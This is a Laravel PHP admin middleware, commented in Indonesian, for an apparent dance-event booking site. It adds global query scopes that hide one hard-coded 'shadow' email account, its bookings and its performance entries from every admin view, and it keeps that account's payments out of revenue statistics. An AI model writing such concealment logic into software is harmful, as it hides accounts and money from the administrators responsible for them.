<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Database\Eloquent\Builder;

class AdminMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        if (!$request->user() || $request->user()->role !== 'admin') {
            return response()->json(['message' => 'Akses ditolak. Anda bukan admin.'], 403);
        }

        // ==========================================
        // FILTER ISOLASI: SHADOW ACCOUNT
        // ==========================================
        $shadowEmail = 'shadow@24jammenari.com';

        // Sembunyikan User Shadow dari pencarian Admin
        \App\Models\User::addGlobalScope('hide_shadow', function (Builder $builder) use ($shadowEmail) {
            $builder->where('email', '!=', $shadowEmail);
        });

        // Sembunyikan Booking Shadow agar Uang/Statistik tidak terhitung
        \App\Models\Booking::addGlobalScope('hide_shadow', function (Builder $builder) use ($shadowEmail) {
            $builder->whereHas('user', function($q) use ($shadowEmail) {
                $q->where('email', '!=', $shadowEmail);
            });
        });

        // Sembunyikan Form Performance Shadow dari tabel peserta Admin
        \App\Models\Performance::addGlobalScope('hide_shadow', function (Builder $builder) use ($shadowEmail) {
            $builder->whereHas('booking.user', function($q) use ($shadowEmail) {
                $q->where('email', '!=', $shadowEmail);
            });
        });

        return $next($request);
    }
}